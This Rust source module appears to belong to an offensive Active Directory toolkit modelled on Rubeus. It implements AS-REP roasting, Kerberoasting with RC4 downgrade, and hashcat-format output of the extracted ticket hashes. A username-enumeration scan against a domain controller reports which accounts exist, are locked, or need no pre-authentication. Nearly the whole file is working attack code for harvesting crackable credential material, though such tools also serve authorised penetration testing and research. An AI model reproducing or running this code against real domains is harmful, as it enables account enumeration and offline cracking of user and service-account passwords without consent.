use std::error::Error;

#[derive(Debug, Clone)]
pub struct RoastResult {
    pub username: String,
    pub domain: String,
    pub spn: Option<String>,
    pub hash_data: Vec<u8>,
    pub etype: i32,
    pub checksum: Vec<u8>,
}

impl RoastResult {
    pub fn to_hashcat(&self) -> String {
        let hex_data = hex_encode(&self.hash_data);
        let hex_check = hex_encode(&self.checksum);
        if let Some(ref spn) = self.spn {
            // $krb5tgs$etype$*user$realm$spn*$checksum$edata
            format!("$krb5tgs${}$*{}${}${}*${}${}",
                self.etype, self.username, self.domain, spn, hex_check, hex_data)
        } else {
            // $krb5asrep$etype$user@realm:checksum$edata
            format!("$krb5asrep${}${}@{}:{}${}",
                self.etype, self.username, self.domain, hex_check, hex_data)
        }
    }
}

pub async fn asreproast_user(
    dc: &str,
    domain: &str,
    username: &str,
) -> Result<Option<RoastResult>, Box<dyn Error>> {
    let realm = domain.to_uppercase();
    let nonce: u32 = rand::random();

    let as_req = build_asreproast_asreq(username, &realm, nonce);
    let response = crate::kerberos::send_kdc(dc, &as_req, false).await?;

    if response.len() < 4 { return Ok(None); }

    // Check if AS-REP (tag 0x6b = [APPLICATION 11])
    if response[0] == 0x6b || (response[0] == 0x7b) {
        let (checksum, edata) = extract_asrep_hash(&response)?;
        return Ok(Some(RoastResult {
            username: username.to_string(),
            domain: realm,
            spn: None,
            hash_data: edata,
            etype: 23,
            checksum,
        }));
    }

    Ok(None)
}

pub async fn kerberoast_spn(
    dc: &str,
    domain: &str,
    spn: &str,
    tgt: &[u8],
    session_key: &[u8],
) -> Result<Option<RoastResult>, Box<dyn Error>> {
    use crate::kerberos::asktgs::{ask_tgs, AskTgsParams};
    use crate::kerberos::crypto::ETYPE_RC4_HMAC;

    let realm = domain.to_uppercase();

    let params = AskTgsParams {
        dc: dc.to_string(),
        domain: realm.clone(),
        username: "user".to_string(),
        spn: spn.to_string(),
        tgt_raw: tgt.to_vec(),
        session_key: session_key.to_vec(),
        session_etype: ETYPE_RC4_HMAC,
        target_etype: Some(ETYPE_RC4_HMAC),
        enterprise: false,
    };

    match ask_tgs(&params).await {
        Ok(result) => {
            let cipher = &result.enc_part_cipher;
            if cipher.len() < 16 {
                return Err("TGS-REP cipher too short for hash extraction".into());
            }
            let checksum = cipher[..16].to_vec();
            let edata = cipher[16..].to_vec();
            let svc_account = spn.split('/').next().unwrap_or(spn);

            Ok(Some(RoastResult {
                username: svc_account.to_string(),
                domain: realm,
                spn: Some(spn.to_string()),
                hash_data: edata,
                etype: result.enc_part_etype,
                checksum,
            }))
        }
        Err(e) => {
            log::debug!("Kerberoast for {} failed: {}", spn, e);
            Ok(None)
        }
    }
}

fn build_asreproast_asreq(username: &str, realm: &str, nonce: u32) -> Vec<u8> {
    let mut body = Vec::new();

    // KDC-REQ-BODY
    let cname = encode_principal_name(1, &[username]); // NT-PRINCIPAL
    let sname = encode_principal_name(2, &["krbtgt", realm]); // NT-SRV-INST
    let realm_enc = encode_general_string(realm);
    let till = encode_generalized_time("20370913024805Z");
    let nonce_enc = encode_integer_u32(nonce);
    let etypes = encode_sequence(&[&encode_integer(23)]); // RC4_HMAC only

    // kdc-options: forwardable, renewable, renewable-ok
    let kdc_options = encode_bitstring(&0x40810010u32.to_be_bytes());

    body.extend(encode_context_tag(0, &kdc_options));
    body.extend(encode_context_tag(1, &cname));
    body.extend(encode_context_tag(2, &realm_enc));
    body.extend(encode_context_tag(3, &sname));
    body.extend(encode_context_tag(5, &till));
    body.extend(encode_context_tag(7, &nonce_enc));
    body.extend(encode_context_tag(8, &etypes));

    let req_body = encode_sequence(&[&body]);

    // KDC-REQ (AS-REQ = APPLICATION[10])
    let mut kdc_req = Vec::new();
    kdc_req.extend(encode_context_tag(1, &encode_integer(5))); // pvno
    kdc_req.extend(encode_context_tag(2, &encode_integer(10))); // msg-type AS-REQ
    // No padata (no pre-auth)
    kdc_req.extend(encode_context_tag(4, &req_body));

    let seq = encode_sequence(&[&kdc_req]);
    encode_application_tag(10, &seq)
}

fn extract_asrep_hash(data: &[u8]) -> Result<(Vec<u8>, Vec<u8>), Box<dyn Error>> {
    // Parse AS-REP to find enc-part cipher data
    // AS-REP structure: APPLICATION[11] SEQUENCE { ... enc-part[6] EncryptedData }
    // EncryptedData = SEQUENCE { etype[0] INTEGER, kvno[1] INTEGER OPTIONAL, cipher[2] OCTET STRING }
    let cipher = find_enc_part_cipher(data, 0x6b)?;
    if cipher.len() < 16 {
        return Err("cipher too short".into());
    }
    // For RC4 (etype 23): first 16 bytes = checksum, rest = encrypted data
    let checksum = cipher[..16].to_vec();
    let edata = cipher[16..].to_vec();
    Ok((checksum, edata))
}

fn find_enc_part_cipher(data: &[u8], _app_tag: u8) -> Result<Vec<u8>, Box<dyn Error>> {
    // Walk ASN.1 to find the last OCTET STRING in the last EncryptedData SEQUENCE
    // This is a simplified parser — looks for the cipher field
    let mut pos = 0;
    let mut last_octet_string = Vec::new();

    while pos < data.len() {
        if pos + 2 > data.len() { break; }
        let tag = data[pos];
        pos += 1;

        let len = parse_asn1_length(data, &mut pos)?;
        if pos + len > data.len() { break; }

        if tag == 0x04 || tag == 0x82 {
            // OCTET STRING
            last_octet_string = data[pos..pos+len].to_vec();
        }

        // Recurse into constructed types
        if tag & 0x20 != 0 || tag >= 0xa0 {
            // Don't advance pos — recurse into the content
            continue;
        }

        pos += len;
    }

    if last_octet_string.is_empty() {
        // Fallback: find the largest continuous block of non-ASN1 data near the end
        // The cipher is typically the last large OCTET STRING
        let search_start = if data.len() > 256 { data.len() - 256 } else { 0 };
        for i in (search_start..data.len()).rev() {
            if data[i] == 0x04 && i + 1 < data.len() {
                let mut p = i + 1;
                if let Ok(len) = parse_asn1_length(data, &mut p) {
                    if p + len <= data.len() && len > 16 {
                        return Ok(data[p..p+len].to_vec());
                    }
                }
            }
        }
        return Err("Could not find cipher in response".into());
    }

    Ok(last_octet_string)
}

fn parse_asn1_length(data: &[u8], pos: &mut usize) -> Result<usize, Box<dyn Error>> {
    if *pos >= data.len() { return Err("unexpected end".into()); }
    let first = data[*pos];
    *pos += 1;

    if first < 0x80 {
        return Ok(first as usize);
    }

    let num_bytes = (first & 0x7f) as usize;
    if num_bytes > 4 || *pos + num_bytes > data.len() {
        return Err("invalid length".into());
    }

    let mut len = 0usize;
    for _ in 0..num_bytes {
        len = (len << 8) | (data[*pos] as usize);
        *pos += 1;
    }
    Ok(len)
}

// ASN.1 DER encoding helpers
fn encode_length(len: usize) -> Vec<u8> {
    if len < 0x80 {
        vec![len as u8]
    } else if len < 0x100 {
        vec![0x81, len as u8]
    } else if len < 0x10000 {
        vec![0x82, (len >> 8) as u8, len as u8]
    } else {
        vec![0x83, (len >> 16) as u8, (len >> 8) as u8, len as u8]
    }
}

fn encode_sequence(items: &[&[u8]]) -> Vec<u8> {
    let mut content = Vec::new();
    for item in items {
        content.extend_from_slice(item);
    }
    let mut out = vec![0x30];
    out.extend(encode_length(content.len()));
    out.extend(content);
    out
}

fn encode_context_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![0xa0 | tag];
    out.extend(encode_length(content.len()));
    out.extend(content);
    out
}

fn encode_application_tag(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![0x60 | tag];
    out.extend(encode_length(content.len()));
    out.extend(content);
    out
}

fn encode_integer(val: i32) -> Vec<u8> {
    let mut out = vec![0x02];
    if val >= 0 && val < 128 {
        out.extend(encode_length(1));
        out.push(val as u8);
    } else {
        let bytes = val.to_be_bytes();
        let start = bytes.iter().position(|&b| b != 0).unwrap_or(3);
        let trimmed = &bytes[start..];
        out.extend(encode_length(trimmed.len()));
        out.extend(trimmed);
    }
    out
}

fn encode_integer_u32(val: u32) -> Vec<u8> {
    let mut out = vec![0x02];
    let bytes = val.to_be_bytes();
    let start = bytes.iter().position(|&b| b != 0).unwrap_or(3);
    let trimmed = &bytes[start..];
    if trimmed.is_empty() || trimmed[0] & 0x80 != 0 {
        out.extend(encode_length(trimmed.len() + 1));
        out.push(0);
        out.extend(trimmed);
    } else {
        out.extend(encode_length(trimmed.len()));
        out.extend(trimmed);
    }
    out
}

fn encode_general_string(s: &str) -> Vec<u8> {
    let mut out = vec![0x1b];
    out.extend(encode_length(s.len()));
    out.extend(s.as_bytes());
    out
}

fn encode_generalized_time(t: &str) -> Vec<u8> {
    let mut out = vec![0x18];
    out.extend(encode_length(t.len()));
    out.extend(t.as_bytes());
    out
}

fn encode_bitstring(data: &[u8]) -> Vec<u8> {
    let mut out = vec![0x03];
    out.extend(encode_length(data.len() + 1));
    out.push(0); // unused bits
    out.extend(data);
    out
}

fn encode_principal_name(name_type: i32, names: &[&str]) -> Vec<u8> {
    let name_type_enc = encode_integer(name_type);
    let mut name_strings = Vec::new();
    for name in names {
        name_strings.extend(encode_general_string(name));
    }
    let name_string_seq = encode_sequence(&[&name_strings]);

    let mut content = Vec::new();
    content.extend(encode_context_tag(0, &name_type_enc));
    content.extend(encode_context_tag(1, &name_string_seq));
    encode_sequence(&[&content])
}

fn hex_encode(data: &[u8]) -> String {
    data.iter().map(|b| format!("{:02x}", b)).collect()
}

pub fn format_results(results: &[RoastResult]) -> String {
    let mut out = String::new();
    for r in results {
        out.push_str(&r.to_hashcat());
        out.push('\n');
    }
    out
}

// ---------------------------------------------------------------------------
// Pre-authentication scan (Rubeus preauthscan)
// ---------------------------------------------------------------------------

#[derive(Debug, Clone)]
pub struct PreauthScanResult {
    pub username: String,
    pub no_preauth: bool,
    pub exists: bool,
    pub locked: bool,
    pub error_code: Option<u32>,
}

pub async fn preauthscan(
    dc: &str,
    domain: &str,
    usernames: &[String],
    delay_ms: u64,
) -> Result<Vec<PreauthScanResult>, Box<dyn Error>> {
    let realm = domain.to_uppercase();
    let mut results = Vec::with_capacity(usernames.len());

    for username in usernames {
        let nonce: u32 = rand::random();
        let as_req = build_asreproast_asreq(username, &realm, nonce);

        let result = match crate::kerberos::send_kdc(dc, &as_req, false).await {
            Ok(response) => classify_preauth_response(username, &response),
            Err(e) => {
                log::debug!("preauthscan: network error for {}: {}", username, e);
                PreauthScanResult {
                    username: username.clone(),
                    no_preauth: false,
                    exists: false,
                    locked: false,
                    error_code: None,
                }
            }
        };

        results.push(result);

        if delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(delay_ms)).await;
        }
    }

    Ok(results)
}

fn classify_preauth_response(username: &str, response: &[u8]) -> PreauthScanResult {
    if response.is_empty() {
        return PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: false,
            locked: false,
            error_code: None,
        };
    }

    // AS-REP (APPLICATION[11] = 0x6b) → no preauth required
    if response[0] == 0x6b || response[0] == 0x7b {
        return PreauthScanResult {
            username: username.to_string(),
            no_preauth: true,
            exists: true,
            locked: false,
            error_code: None,
        };
    }

    // KRB-ERROR (APPLICATION[30] = 0x7e)
    let code = extract_krb_error_code(response);
    match code {
        Some(6) => PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: false,
            locked: false,
            error_code: code,
        },
        Some(18) => PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: true,
            locked: true,
            error_code: code,
        },
        Some(25) => PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: true,
            locked: false,
            error_code: code,
        },
        Some(24) => PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: true,
            locked: false,
            error_code: code,
        },
        _ => PreauthScanResult {
            username: username.to_string(),
            no_preauth: false,
            exists: false,
            locked: false,
            error_code: code,
        },
    }
}

fn extract_krb_error_code(data: &[u8]) -> Option<u32> {
    // KRB-ERROR = APPLICATION[30] SEQUENCE { ... error-code[6] INTEGER ... }
    for i in 0..data.len().saturating_sub(4) {
        if data[i] == 0xa6 {
            let mut pos = i + 1;
            if let Ok(len) = parse_asn1_length(data, &mut pos) {
                if pos + len <= data.len() && pos < data.len() && data[pos] == 0x02 {
                    pos += 1;
                    if let Ok(int_len) = parse_asn1_length(data, &mut pos) {
                        let mut val = 0u32;
                        for j in 0..int_len.min(4) {
                            if pos + j < data.len() {
                                val = (val << 8) | data[pos + j] as u32;
                            }
                        }
                        return Some(val);
                    }
                }
            }
        }
    }
    None
}

pub fn format_preauthscan_results(results: &[PreauthScanResult]) -> String {
    let mut out = String::new();
    for r in results {
        let status = if r.no_preauth {
            "NO_PREAUTH (AS-REP roastable)"
        } else if !r.exists {
            "NOT_FOUND"
        } else if r.locked {
            "LOCKED/DISABLED"
        } else {
            "PREAUTH_REQUIRED"
        };
        out.push_str(&format!("  {:<40} {}\n", r.username, status));
    }
    out
}
